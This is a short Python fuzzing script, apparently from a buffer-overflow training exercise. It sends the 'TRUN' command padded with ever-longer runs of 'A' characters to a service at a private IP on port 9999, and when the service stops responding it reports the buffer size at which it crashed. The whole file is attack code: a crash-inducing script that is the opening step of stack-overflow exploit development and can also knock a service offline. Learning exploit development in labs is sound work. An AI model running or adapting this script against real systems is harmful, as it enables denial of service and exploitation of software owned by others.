#!/usr/bin/python3

import sys, socket
from time import sleep

host = '172.16.10.101'
port = 9999
buffer = memoryview(("A" * 100).encode())


def fuzzer(host, port, buffer):

	# Access the memory and decode to ascii
	buffer = buffer.tobytes().decode()
	
	while True:
		try:
			s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host, port))

	# Sending A's to TRUN and overflowing the buffer
			s.send(('TRUN /.:/' + buffer).encode('ascii'))
			s.close()
			sleep(1)
			buffer += "A" * 100
			print("Fuzzing at %s bytes" % str(len(buffer)))	
	
		except:
			print("Fuzzer crashed at %s bytes" % str(len(buffer)))
			sys.exit()


if __name__ == '__main__':
	fuzzer(host, port, buffer)
